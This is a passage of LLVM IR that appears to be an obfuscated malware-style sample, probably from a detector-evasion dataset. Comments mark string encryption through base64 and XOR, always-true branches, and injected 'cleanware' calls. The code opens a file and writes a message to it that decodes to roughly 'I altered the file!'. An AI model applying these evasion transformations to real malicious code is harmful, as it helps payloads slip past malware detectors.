  store i24 %xp77, i24* %fi.77

  %spi77 = ptrtoint i24* %fi.77 to i32
  store i32 %spi77, i32* %44, align 4
;-------------------------------
  %tmp2_v7.i27.i.i = add i32 %tmp0_v.i.i, -96
  %45 = inttoptr i32 %tmp2_v7.i27.i.i to i32*
;-------------------------------
; Replace: store i32 134520869, i32* %45, align 16
  %sp0.78 = alloca [15 x i8]
;-------------------------------
; Replace: store [15 x i8] c"\02\0D\33\31\05\50\00\5E\54\46\57\12\0C\05\49", [15 x i8]* %sp0.78
  %sp137 = alloca [15 x i8]
  
;-------------------------------
; Replace: %s0.137 = load [1 x i8], [1 x i8]* @str.0.137
  %cipher.ptr.369 = alloca [5 x i8]
  store [5 x i8] c"\41\67\3d\3d\00", [5 x i8]* %cipher.ptr.369
  %cipher.369 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.369, i32 0, i32 0
  %plain.ptr.369 = tail call i8* @base64_decode(i8* %cipher.369)
  %spi369 = bitcast i8* %plain.ptr.369 to [1 x i8]*
  %s0.137 = load [1 x i8], [1 x i8]* %spi369
;-------------------------------
  %sp0.137 = bitcast [15 x i8]* %sp137 to [1 x i8]*
  store [1 x i8] %s0.137, [1 x i8]* %sp0.137
  %next0.137 = getelementptr [15 x i8], [15 x i8]* %sp137, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.137 = load [2 x i8], [2 x i8]* @str.1.137
  %cipher.ptr.365 = alloca [5 x i8]
  store [5 x i8] c"\44\54\4d\3d\00", [5 x i8]* %cipher.ptr.365
  %cipher.365 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.365, i32 0, i32 0
  %plain.ptr.365 = tail call i8* @base64_decode(i8* %cipher.365)
  %spi365 = bitcast i8* %plain.ptr.365 to [2 x i8]*
  %s1.137 = load [2 x i8], [2 x i8]* %spi365
;-------------------------------
  %sp1.137 = bitcast i8* %next0.137 to [2 x i8]*
  store [2 x i8] %s1.137, [2 x i8]* %sp1.137
  %next1.137 = getelementptr [15 x i8], [15 x i8]* %sp137, i32 0, i32 3
  
;-------------------------------
; Replace: %s2.137 = load [2 x i8], [2 x i8]* @str.2.137
  %cipher.ptr.364 = alloca [5 x i8]
  store [5 x i8] c"\4d\51\55\3d\00", [5 x i8]* %cipher.ptr.364
  %cipher.364 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.364, i32 0, i32 0
  %plain.ptr.364 = tail call i8* @base64_decode(i8* %cipher.364)
  %spi364 = bitcast i8* %plain.ptr.364 to [2 x i8]*
  %s2.137 = load [2 x i8], [2 x i8]* %spi364
;-------------------------------
  %sp2.137 = bitcast i8* %next1.137 to [2 x i8]*
  store [2 x i8] %s2.137, [2 x i8]* %sp2.137
  %next2.137 = getelementptr [15 x i8], [15 x i8]* %sp137, i32 0, i32 5
  
;-------------------------------
; Replace: %s3.137 = load [2 x i8], [2 x i8]* @str.3.137
  %cipher.ptr.367 = alloca [5 x i8]
  store [5 x i8] c"\55\41\41\3d\00", [5 x i8]* %cipher.ptr.367
  %cipher.367 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.367, i32 0, i32 0
  %plain.ptr.367 = tail call i8* @base64_decode(i8* %cipher.367)
  %spi367 = bitcast i8* %plain.ptr.367 to [2 x i8]*
  %s3.137 = load [2 x i8], [2 x i8]* %spi367
;-------------------------------
  %sp3.137 = bitcast i8* %next2.137 to [2 x i8]*
  store [2 x i8] %s3.137, [2 x i8]* %sp3.137
  %next3.137 = getelementptr [15 x i8], [15 x i8]* %sp137, i32 0, i32 7
  
;-------------------------------
; Replace: %s4.137 = load [2 x i8], [2 x i8]* @str.4.137
  %cipher.ptr.366 = alloca [5 x i8]
  store [5 x i8] c"\58\6c\51\3d\00", [5 x i8]* %cipher.ptr.366
  %cipher.366 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.366, i32 0, i32 0
  %plain.ptr.366 = tail call i8* @base64_decode(i8* %cipher.366)
  %spi366 = bitcast i8* %plain.ptr.366 to [2 x i8]*
  %s4.137 = load [2 x i8], [2 x i8]* %spi366
;-------------------------------
  %sp4.137 = bitcast i8* %next3.137 to [2 x i8]*
  store [2 x i8] %s4.137, [2 x i8]* %sp4.137
  %next4.137 = getelementptr [15 x i8], [15 x i8]* %sp137, i32 0, i32 9
  
;-------------------------------
; Replace: %s5.137 = load [2 x i8], [2 x i8]* @str.5.137
  %cipher.ptr.370 = alloca [5 x i8]
  store [5 x i8] c"\52\6c\63\3d\00", [5 x i8]* %cipher.ptr.370
  %cipher.370 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.370, i32 0, i32 0
  %plain.ptr.370 = tail call i8* @base64_decode(i8* %cipher.370)
  %spi370 = bitcast i8* %plain.ptr.370 to [2 x i8]*
  %s5.137 = load [2 x i8], [2 x i8]* %spi370
;-------------------------------
  %sp5.137 = bitcast i8* %next4.137 to [2 x i8]*
  store [2 x i8] %s5.137, [2 x i8]* %sp5.137
  %next5.137 = getelementptr [15 x i8], [15 x i8]* %sp137, i32 0, i32 11
  
;-------------------------------
; Replace: %s6.137 = load [2 x i8], [2 x i8]* @str.6.137
  %cipher.ptr.368 = alloca [5 x i8]
  store [5 x i8] c"\45\67\77\3d\00", [5 x i8]* %cipher.ptr.368
  %cipher.368 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.368, i32 0, i32 0
  %plain.ptr.368 = tail call i8* @base64_decode(i8* %cipher.368)
  %spi368 = bitcast i8* %plain.ptr.368 to [2 x i8]*
  %s6.137 = load [2 x i8], [2 x i8]* %spi368
;-------------------------------
  %sp6.137 = bitcast i8* %next5.137 to [2 x i8]*
  store [2 x i8] %s6.137, [2 x i8]* %sp6.137
  %next6.137 = getelementptr [15 x i8], [15 x i8]* %sp137, i32 0, i32 13
  
;-------------------------------
; Replace: %s7.137 = load [2 x i8], [2 x i8]* @str.7.137
  %cipher.ptr.371 = alloca [5 x i8]
  store [5 x i8] c"\42\55\6b\3d\00", [5 x i8]* %cipher.ptr.371
  %cipher.371 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.371, i32 0, i32 0
  %plain.ptr.371 = tail call i8* @base64_decode(i8* %cipher.371)
  %spi371 = bitcast i8* %plain.ptr.371 to [2 x i8]*
  %s7.137 = load [2 x i8], [2 x i8]* %spi371
;-------------------------------
  %sp7.137 = bitcast i8* %next6.137 to [2 x i8]*
  store [2 x i8] %s7.137, [2 x i8]* %sp7.137

  %spi137 = load [15 x i8], [15 x i8]* %sp137
  store [15 x i8] %spi137, [15 x i8]* %sp0.78
;-------------------------------
  %sp0.1.78 = bitcast [15 x i8]* %sp0.78 to i120*
  %i0.78 = load i120, i120* %sp0.1.78

  %sp1.78 = alloca [15 x i8]
;-------------------------------
; Replace: store [15 x i8] c"\76\68\4b\45\5a\36\69\32\31\75\79\66\74\71\49", [15 x i8]* %sp1.78
  %sp138 = alloca [15 x i8]
  
;-------------------------------
; Replace: %s0.138 = load [1 x i8], [1 x i8]* @str.0.138
  %cipher.ptr.372 = alloca [5 x i8]
  store [5 x i8] c"\64\67\3d\3d\00", [5 x i8]* %cipher.ptr.372
  %cipher.372 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.372, i32 0, i32 0
  %plain.ptr.372 = tail call i8* @base64_decode(i8* %cipher.372)
  %spi372 = bitcast i8* %plain.ptr.372 to [1 x i8]*
  %s0.138 = load [1 x i8], [1 x i8]* %spi372
;-------------------------------
  %sp0.138 = bitcast [15 x i8]* %sp138 to [1 x i8]*
  store [1 x i8] %s0.138, [1 x i8]* %sp0.138
  %next0.138 = getelementptr [15 x i8], [15 x i8]* %sp138, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.138 = load [2 x i8], [2 x i8]* @str.1.138
  %cipher.ptr.373 = alloca [5 x i8]
  store [5 x i8] c"\61\45\73\3d\00", [5 x i8]* %cipher.ptr.373
  %cipher.373 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.373, i32 0, i32 0
  %plain.ptr.373 = tail call i8* @base64_decode(i8* %cipher.373)
  %spi373 = bitcast i8* %plain.ptr.373 to [2 x i8]*
  %s1.138 = load [2 x i8], [2 x i8]* %spi373
;-------------------------------
  %sp1.138 = bitcast i8* %next0.138 to [2 x i8]*
  store [2 x i8] %s1.138, [2 x i8]* %sp1.138
  %next1.138 = getelementptr [15 x i8], [15 x i8]* %sp138, i32 0, i32 3
  
;-------------------------------
; Replace: %s2.138 = load [2 x i8], [2 x i8]* @str.2.138
  %cipher.ptr.375 = alloca [5 x i8]
  store [5 x i8] c"\52\56\6f\3d\00", [5 x i8]* %cipher.ptr.375
  %cipher.375 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.375, i32 0, i32 0
  %plain.ptr.375 = tail call i8* @base64_decode(i8* %cipher.375)
  %spi375 = bitcast i8* %plain.ptr.375 to [2 x i8]*
  %s2.138 = load [2 x i8], [2 x i8]* %spi375
;-------------------------------
  %sp2.138 = bitcast i8* %next1.138 to [2 x i8]*
  store [2 x i8] %s2.138, [2 x i8]* %sp2.138
  %next2.138 = getelementptr [15 x i8], [15 x i8]* %sp138, i32 0, i32 5
  
;-------------------------------
; Replace: %s3.138 = load [2 x i8], [2 x i8]* @str.3.138
  %cipher.ptr.376 = alloca [5 x i8]
  store [5 x i8] c"\4e\6d\6b\3d\00", [5 x i8]* %cipher.ptr.376
  %cipher.376 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.376, i32 0, i32 0
  %plain.ptr.376 = tail call i8* @base64_decode(i8* %cipher.376)
  %spi376 = bitcast i8* %plain.ptr.376 to [2 x i8]*
  %s3.138 = load [2 x i8], [2 x i8]* %spi376
;-------------------------------
  %sp3.138 = bitcast i8* %next2.138 to [2 x i8]*
  store [2 x i8] %s3.138, [2 x i8]* %sp3.138
  %next3.138 = getelementptr [15 x i8], [15 x i8]* %sp138, i32 0, i32 7
  
;-------------------------------
; Replace: %s4.138 = load [2 x i8], [2 x i8]* @str.4.138
  %cipher.ptr.379 = alloca [5 x i8]
  store [5 x i8] c"\4d\6a\45\3d\00", [5 x i8]* %cipher.ptr.379
  %cipher.379 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.379, i32 0, i32 0
  %plain.ptr.379 = tail call i8* @base64_decode(i8* %cipher.379)
  %spi379 = bitcast i8* %plain.ptr.379 to [2 x i8]*
  %s4.138 = load [2 x i8], [2 x i8]* %spi379
;-------------------------------
  %sp4.138 = bitcast i8* %next3.138 to [2 x i8]*
  store [2 x i8] %s4.138, [2 x i8]* %sp4.138
  %next4.138 = getelementptr [15 x i8], [15 x i8]* %sp138, i32 0, i32 9
  
;-------------------------------
; Replace: %s5.138 = load [2 x i8], [2 x i8]* @str.5.138
  %cipher.ptr.377 = alloca [5 x i8]
  store [5 x i8] c"\64\58\6b\3d\00", [5 x i8]* %cipher.ptr.377
  %cipher.377 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.377, i32 0, i32 0
  %plain.ptr.377 = tail call i8* @base64_decode(i8* %cipher.377)
  %spi377 = bitcast i8* %plain.ptr.377 to [2 x i8]*
  %s5.138 = load [2 x i8], [2 x i8]* %spi377
;-------------------------------
  %sp5.138 = bitcast i8* %next4.138 to [2 x i8]*
  store [2 x i8] %s5.138, [2 x i8]* %sp5.138
  %next5.138 = getelementptr [15 x i8], [15 x i8]* %sp138, i32 0, i32 11
  
;-------------------------------
; Replace: %s6.138 = load [2 x i8], [2 x i8]* @str.6.138
  %cipher.ptr.378 = alloca [5 x i8]
  store [5 x i8] c"\5a\6e\51\3d\00", [5 x i8]* %cipher.ptr.378
  %cipher.378 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.378, i32 0, i32 0
  %plain.ptr.378 = tail call i8* @base64_decode(i8* %cipher.378)
  %spi378 = bitcast i8* %plain.ptr.378 to [2 x i8]*
  %s6.138 = load [2 x i8], [2 x i8]* %spi378
;-------------------------------
  %sp6.138 = bitcast i8* %next5.138 to [2 x i8]*
  store [2 x i8] %s6.138, [2 x i8]* %sp6.138
  %next6.138 = getelementptr [15 x i8], [15 x i8]* %sp138, i32 0, i32 13
  
;-------------------------------
; Replace: %s7.138 = load [2 x i8], [2 x i8]* @str.7.138
  %cipher.ptr.374 = alloca [5 x i8]
  store [5 x i8] c"\63\55\6b\3d\00", [5 x i8]* %cipher.ptr.374
  %cipher.374 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.374, i32 0, i32 0
  %plain.ptr.374 = tail call i8* @base64_decode(i8* %cipher.374)
  %spi374 = bitcast i8* %plain.ptr.374 to [2 x i8]*
  %s7.138 = load [2 x i8], [2 x i8]* %spi374
;-------------------------------
  %sp7.138 = bitcast i8* %next6.138 to [2 x i8]*
  store [2 x i8] %s7.138, [2 x i8]* %sp7.138

  %spi138 = load [15 x i8], [15 x i8]* %sp138
  store [15 x i8] %spi138, [15 x i8]* %sp1.78
;-------------------------------
  %sp1.1.78 = bitcast [15 x i8]* %sp1.78 to i120*
  %i1.78 = load i120, i120* %sp1.1.78

  %xp78 = xor i120 %i0.78, %i1.78

  %fi.78 = alloca i120
  store i120 %xp78, i120* %fi.78

  %spi78 = ptrtoint i120* %fi.78 to i32
  store i32 %spi78, i32* %45, align 16
;-------------------------------
  %tmp2_v8.i28.i.i = add i32 %tmp0_v.i.i, -100
  %46 = inttoptr i32 %tmp2_v8.i28.i.i to i32*
  store i32 134517521, i32* %46, align 4
  %arg.i.i.i14 = load i32, i32* %45, align 16
  %arg2.i.i.i15 = load i32, i32* %44, align 4
  %47 = tail call i32 @fopen(i32 %arg.i.i.i14, i32 %arg2.i.i.i15)
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @swap_cols693 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack692, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  %tmp2_v.i.i.i = add i32 %tmp0_v.i.i, -76
  %48 = inttoptr i32 %tmp2_v.i.i.i to i32*
  store i32 %47, i32* %48, align 4
  %tmp2_v.i2.i.i = add i32 %tmp0_v.i.i, -72
  %49 = inttoptr i32 %tmp2_v.i2.i.i to i32*
  store i32 1818304585, i32* %49, align 8
  %tmp2_v1.i3.i.i = add i32 %tmp0_v.i.i, -68
  %50 = inttoptr i32 %tmp2_v1.i3.i.i to i32*
  store i32 1701995892, i32* %50, align 4
  %tmp2_v2.i.i.i = add i32 %tmp0_v.i.i, -64
  %51 = inttoptr i32 %tmp2_v2.i.i.i to i32*
  store i32 1752440932, i32* %51, align 16
  %tmp2_v3.i.i.i16 = add i32 %tmp0_v.i.i, -60
  %52 = inttoptr i32 %tmp2_v3.i.i.i16 to i32*
  store i32 1768300645, i32* %52, align 4
  %tmp2_v4.i.i.i17 = add i32 %tmp0_v.i.i, -56
  %53 = inttoptr i32 %tmp2_v4.i.i.i17 to i32*
  store i32 2188652, i32* %53, align 8
  %54 = load i32, i32* %48, align 4
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @find_array_length464 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack463, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  store i32 %54, i32* %41, align 4
  %tmp2_v7.i.i.i18 = add i32 %tmp0_v.i.i, -88
  %55 = inttoptr i32 %tmp2_v7.i.i.i18 to i32*
  store i32 20, i32* %55, align 8
  store i32 1, i32* %44, align 4
;-------------------------------
;--------Basic Condition--------
  %.not95.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not95.i.i, label %BB_95, label %next95
next95:
;-------------------------------
  store i32 %tmp2_v.i2.i.i, i32* %45, align 16
  store i32 134517622, i32* %46, align 4
  %arg.i.i4.i = load i32, i32* %45, align 16
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @min_occur_char395 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack394, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  %arg2.i.i5.i = load i32, i32* %44, align 4
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @check_if_array_sorted79 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack78, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  %arg4.i.i.i19 = load i32, i32* %55, align 8
;-------------------------------
;--------Basic Condition--------
  %.not109.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not109.i.i, label %BB_109, label %next109
next109:
;-------------------------------
  %arg6.i.i.i = load i32, i32* %41, align 4
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @ifdef_ifndef316 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack315, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  %56 = tail call i32 @fwrite(i32 %arg.i.i4.i, i32 %arg2.i.i5.i, i32 %arg4.i.i.i19, i32 %arg6.i.i.i)
  %57 = load i32, i32* %48, align 4
  store i32 %57, i32* %45, align 16
  store i32 134517636, i32* %46, align 4
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @memset912 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack911, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  %arg.i.i6.i = load i32, i32* %45, align 16
  %58 = tail call i32 @fclose(i32 %arg.i.i6.i)
  br label %.exit

.exit:                                            ; preds = %BB_804944C.i, %BB_8049472.i, %BB_8049426.i, %BB_8049453.i
  ret void
BB_95:
;-------------------------------
; Replace: %cast95= getelementptr [11 x i8], [11 x i8]* @.str94, i64 0, i64 0
  %spi112 = alloca [11 x i8]
  
;-------------------------------
; Replace: %s0.112 = load [1 x i8], [1 x i8]* @str.0.112
  %cipher.ptr.234 = alloca [5 x i8]
  store [5 x i8] c"\5a\41\3d\3d\00", [5 x i8]* %cipher.ptr.234
  %cipher.234 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.234, i32 0, i32 0
  %plain.ptr.234 = tail call i8* @base64_decode(i8* %cipher.234)
  %spi234 = bitcast i8* %plain.ptr.234 to [1 x i8]*
  %s0.112 = load [1 x i8], [1 x i8]* %spi234
;-------------------------------
  %sp0.112 = bitcast [11 x i8]* %spi112 to [1 x i8]*
  store [1 x i8] %s0.112, [1 x i8]* %sp0.112
  %next0.112 = getelementptr [11 x i8], [11 x i8]* %spi112, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.112 = load [1 x i8], [1 x i8]* @str.1.112
  %cipher.ptr.229 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.229
  %cipher.229 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.229, i32 0, i32 0
  %plain.ptr.229 = tail call i8* @base64_decode(i8* %cipher.229)
  %spi229 = bitcast i8* %plain.ptr.229 to [1 x i8]*
  %s1.112 = load [1 x i8], [1 x i8]* %spi229
;-------------------------------
  %sp1.112 = bitcast i8* %next0.112 to [1 x i8]*
  store [1 x i8] %s1.112, [1 x i8]* %sp1.112
  %next1.112 = getelementptr [11 x i8], [11 x i8]* %spi112, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.112 = load [2 x i8], [2 x i8]* @str.2.112
  %cipher.ptr.235 = alloca [5 x i8]
  store [5 x i8] c"\63\6d\63\3d\00", [5 x i8]* %cipher.ptr.235
  %cipher.235 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.235, i32 0, i32 0
  %plain.ptr.235 = tail call i8* @base64_decode(i8* %cipher.235)
  %spi235 = bitcast i8* %plain.ptr.235 to [2 x i8]*
  %s2.112 = load [2 x i8], [2 x i8]* %spi235
;-------------------------------
  %sp2.112 = bitcast i8* %next1.112 to [2 x i8]*
  store [2 x i8] %s2.112, [2 x i8]* %sp2.112
  %next2.112 = getelementptr [11 x i8], [11 x i8]* %spi112, i32 0, i32 4
  
;-------------------------------
; Replace: %s3.112 = load [1 x i8], [1 x i8]* @str.3.112
  %cipher.ptr.233 = alloca [5 x i8]
  store [5 x i8] c"\59\67\3d\3d\00", [5 x i8]* %cipher.ptr.233
  %cipher.233 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.233, i32 0, i32 0
  %plain.ptr.233 = tail call i8* @base64_decode(i8* %cipher.233)
  %spi233 = bitcast i8* %plain.ptr.233 to [1 x i8]*
  %s3.112 = load [1 x i8], [1 x i8]* %spi233
;-------------------------------
  %sp3.112 = bitcast i8* %next2.112 to [1 x i8]*
  store [1 x i8] %s3.112, [1 x i8]* %sp3.112
  %next3.112 = getelementptr [11 x i8], [11 x i8]* %spi112, i32 0, i32 5
  
;-------------------------------
; Replace: %s4.112 = load [1 x i8], [1 x i8]* @str.4.112
  %cipher.ptr.232 = alloca [5 x i8]
  store [5 x i8] c"\61\67\3d\3d\00", [5 x i8]* %cipher.ptr.232
  %cipher.232 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.232, i32 0, i32 0
  %plain.ptr.232 = tail call i8* @base64_decode(i8* %cipher.232)
  %spi232 = bitcast i8* %plain.ptr.232 to [1 x i8]*
  %s4.112 = load [1 x i8], [1 x i8]* %spi232
;-------------------------------
  %sp4.112 = bitcast i8* %next3.112 to [1 x i8]*
  store [1 x i8] %s4.112, [1 x i8]* %sp4.112
  %next4.112 = getelementptr [11 x i8], [11 x i8]* %spi112, i32 0, i32 6
  
;-------------------------------
; Replace: %s5.112 = load [2 x i8], [2 x i8]* @str.5.112
  %cipher.ptr.231 = alloca [5 x i8]
  store [5 x i8] c"\65\6d\55\3d\00", [5 x i8]* %cipher.ptr.231
  %cipher.231 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.231, i32 0, i32 0
  %plain.ptr.231 = tail call i8* @base64_decode(i8* %cipher.231)
  %spi231 = bitcast i8* %plain.ptr.231 to [2 x i8]*
  %s5.112 = load [2 x i8], [2 x i8]* %spi231
;-------------------------------
  %sp5.112 = bitcast i8* %next4.112 to [2 x i8]*
  store [2 x i8] %s5.112, [2 x i8]* %sp5.112
  %next5.112 = getelementptr [11 x i8], [11 x i8]* %spi112, i32 0, i32 8
  
;-------------------------------
; Replace: %s6.112 = load [1 x i8], [1 x i8]* @str.6.112
  %cipher.ptr.236 = alloca [5 x i8]
  store [5 x i8] c"\61\77\3d\3d\00", [5 x i8]* %cipher.ptr.236
  %cipher.236 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.236, i32 0, i32 0
  %plain.ptr.236 = tail call i8* @base64_decode(i8* %cipher.236)
  %spi236 = bitcast i8* %plain.ptr.236 to [1 x i8]*
  %s6.112 = load [1 x i8], [1 x i8]* %spi236
;-------------------------------
  %sp6.112 = bitcast i8* %next5.112 to [1 x i8]*
  store [1 x i8] %s6.112, [1 x i8]* %sp6.112
  %next6.112 = getelementptr [11 x i8], [11 x i8]* %spi112, i32 0, i32 9
  
;-------------------------------
; Replace: %s7.112 = load [2 x i8], [2 x i8]* @str.7.112
  %cipher.ptr.230 = alloca [5 x i8]
  store [5 x i8] c"\59\51\41\3d\00", [5 x i8]* %cipher.ptr.230
  %cipher.230 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.230, i32 0, i32 0
  %plain.ptr.230 = tail call i8* @base64_decode(i8* %cipher.230)
  %spi230 = bitcast i8* %plain.ptr.230 to [2 x i8]*
  %s7.112 = load [2 x i8], [2 x i8]* %spi230
;-------------------------------
  %sp7.112 = bitcast i8* %next6.112 to [2 x i8]*
  store [2 x i8] %s7.112, [2 x i8]* %sp7.112
  %cast95= getelementptr [11 x i8], [11 x i8]* %spi112, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast95)
  br label %next95
BB_97:
;-------------------------------
; Replace: %cast97= getelementptr [10 x i8], [10 x i8]* @.str96, i64 0, i64 0
  %spi113 = alloca [10 x i8]
  
;-------------------------------
; Replace: %s0.113 = load [1 x i8], [1 x i8]* @str.0.113
  %cipher.ptr.238 = alloca [5 x i8]
  store [5 x i8] c"\52\41\3d\3d\00", [5 x i8]* %cipher.ptr.238
  %cipher.238 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.238, i32 0, i32 0
  %plain.ptr.238 = tail call i8* @base64_decode(i8* %cipher.238)
  %spi238 = bitcast i8* %plain.ptr.238 to [1 x i8]*
  %s0.113 = load [1 x i8], [1 x i8]* %spi238
;-------------------------------
  %sp0.113 = bitcast [10 x i8]* %spi113 to [1 x i8]*
  store [1 x i8] %s0.113, [1 x i8]* %sp0.113
  %next0.113 = getelementptr [10 x i8], [10 x i8]* %spi113, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.113 = load [1 x i8], [1 x i8]* @str.1.113
  %cipher.ptr.244 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.244
  %cipher.244 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.244, i32 0, i32 0
  %plain.ptr.244 = tail call i8* @base64_decode(i8* %cipher.244)
  %spi244 = bitcast i8* %plain.ptr.244 to [1 x i8]*
  %s1.113 = load [1 x i8], [1 x i8]* %spi244
;-------------------------------
  %sp1.113 = bitcast i8* %next0.113 to [1 x i8]*
  store [1 x i8] %s1.113, [1 x i8]* %sp1.113
  %next1.113 = getelementptr [10 x i8], [10 x i8]* %spi113, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.113 = load [1 x i8], [1 x i8]* @str.2.113
  %cipher.ptr.240 = alloca [5 x i8]
  store [5 x i8] c"\64\51\3d\3d\00", [5 x i8]* %cipher.ptr.240
  %cipher.240 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.240, i32 0, i32 0
  %plain.ptr.240 = tail call i8* @base64_decode(i8* %cipher.240)
  %spi240 = bitcast i8* %plain.ptr.240 to [1 x i8]*
  %s2.113 = load [1 x i8], [1 x i8]* %spi240
;-------------------------------
  %sp2.113 = bitcast i8* %next1.113 to [1 x i8]*
  store [1 x i8] %s2.113, [1 x i8]* %sp2.113
  %next2.113 = getelementptr [10 x i8], [10 x i8]* %spi113, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.113 = load [2 x i8], [2 x i8]* @str.3.113
  %cipher.ptr.239 = alloca [5 x i8]
  store [5 x i8] c"\65\47\6b\3d\00", [5 x i8]* %cipher.ptr.239
  %cipher.239 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.239, i32 0, i32 0
  %plain.ptr.239 = tail call i8* @base64_decode(i8* %cipher.239)
  %spi239 = bitcast i8* %plain.ptr.239 to [2 x i8]*
  %s3.113 = load [2 x i8], [2 x i8]* %spi239
;-------------------------------
  %sp3.113 = bitcast i8* %next2.113 to [2 x i8]*
  store [2 x i8] %s3.113, [2 x i8]* %sp3.113
  %next3.113 = getelementptr [10 x i8], [10 x i8]* %spi113, i32 0, i32 5
  
;-------------------------------
; Replace: %s4.113 = load [1 x i8], [1 x i8]* @str.4.113
  %cipher.ptr.237 = alloca [5 x i8]
  store [5 x i8] c"\77\77\3d\3d\00", [5 x i8]* %cipher.ptr.237
  %cipher.237 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.237, i32 0, i32 0
  %plain.ptr.237 = tail call i8* @base64_decode(i8* %cipher.237)
  %spi237 = bitcast i8* %plain.ptr.237 to [1 x i8]*
  %s4.113 = load [1 x i8], [1 x i8]* %spi237
;-------------------------------
  %sp4.113 = bitcast i8* %next3.113 to [1 x i8]*
  store [1 x i8] %s4.113, [1 x i8]* %sp4.113
  %next4.113 = getelementptr [10 x i8], [10 x i8]* %spi113, i32 0, i32 6
  
;-------------------------------
; Replace: %s5.113 = load [1 x i8], [1 x i8]* @str.5.113
  %cipher.ptr.243 = alloca [5 x i8]
  store [5 x i8] c"\71\41\3d\3d\00", [5 x i8]* %cipher.ptr.243
  %cipher.243 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.243, i32 0, i32 0
  %plain.ptr.243 = tail call i8* @base64_decode(i8* %cipher.243)
  %spi243 = bitcast i8* %plain.ptr.243 to [1 x i8]*
  %s5.113 = load [1 x i8], [1 x i8]* %spi243
;-------------------------------
  %sp5.113 = bitcast i8* %next4.113 to [1 x i8]*
  store [1 x i8] %s5.113, [1 x i8]* %sp5.113
  %next5.113 = getelementptr [10 x i8], [10 x i8]* %spi113, i32 0, i32 7
  
;-------------------------------
; Replace: %s6.113 = load [1 x i8], [1 x i8]* @str.6.113
  %cipher.ptr.242 = alloca [5 x i8]
  store [5 x i8] c"\62\51\3d\3d\00", [5 x i8]* %cipher.ptr.242
  %cipher.242 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.242, i32 0, i32 0
  %plain.ptr.242 = tail call i8* @base64_decode(i8* %cipher.242)
  %spi242 = bitcast i8* %plain.ptr.242 to [1 x i8]*
  %s6.113 = load [1 x i8], [1 x i8]* %spi242
;-------------------------------
  %sp6.113 = bitcast i8* %next5.113 to [1 x i8]*
  store [1 x i8] %s6.113, [1 x i8]* %sp6.113
  %next6.113 = getelementptr [10 x i8], [10 x i8]* %spi113, i32 0, i32 8
  
;-------------------------------
; Replace: %s7.113 = load [2 x i8], [2 x i8]* @str.7.113
  %cipher.ptr.241 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\41\3d\00", [5 x i8]* %cipher.ptr.241
  %cipher.241 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.241, i32 0, i32 0
  %plain.ptr.241 = tail call i8* @base64_decode(i8* %cipher.241)
  %spi241 = bitcast i8* %plain.ptr.241 to [2 x i8]*
  %s7.113 = load [2 x i8], [2 x i8]* %spi241
;-------------------------------
